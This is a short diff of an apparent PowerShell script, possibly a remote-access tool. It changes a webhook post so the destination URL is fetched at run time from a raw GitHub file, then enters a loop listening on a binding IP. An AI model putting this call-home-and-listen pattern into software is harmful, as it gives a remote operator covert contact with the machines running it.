@@ -47,7 +47,7 @@ $payload = @{
     "Date" = "$(get-date)"
 }
 
-Send-Webhook -WebhookUrl "https://octo.hk/vYqgOaRwfsyj3I0FxuLX" -Data $payload
+Send-Webhook -WebhookUrl ((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Wh).content) -Data $payload
 
 while (1) {
     $r = (Receive $BindingIP 0)
